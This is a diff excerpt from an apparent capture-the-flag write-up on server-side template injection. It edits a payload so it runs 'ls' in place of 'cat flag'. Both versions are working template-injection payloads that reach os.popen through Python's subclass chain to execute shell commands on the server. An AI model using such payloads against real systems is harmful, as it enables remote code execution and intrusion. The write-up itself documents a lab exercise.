@@ -51,7 +51,7 @@ Now we get a long list of subclasses. Our goal here is to get one that would eve
 From here, we can finally execute Linux commands. Let's do an `ls`:
 
 ```
-{{1.__class__.__base__.__subclasses__()[356].__init__.__globals__['sys'].modules['os'].popen('cat flag').read() }}
+{{1.__class__.__base__.__subclasses__()[356].__init__.__globals__['sys'].modules['os'].popen('ls').read() }}
 ```
 
 We get the following result:
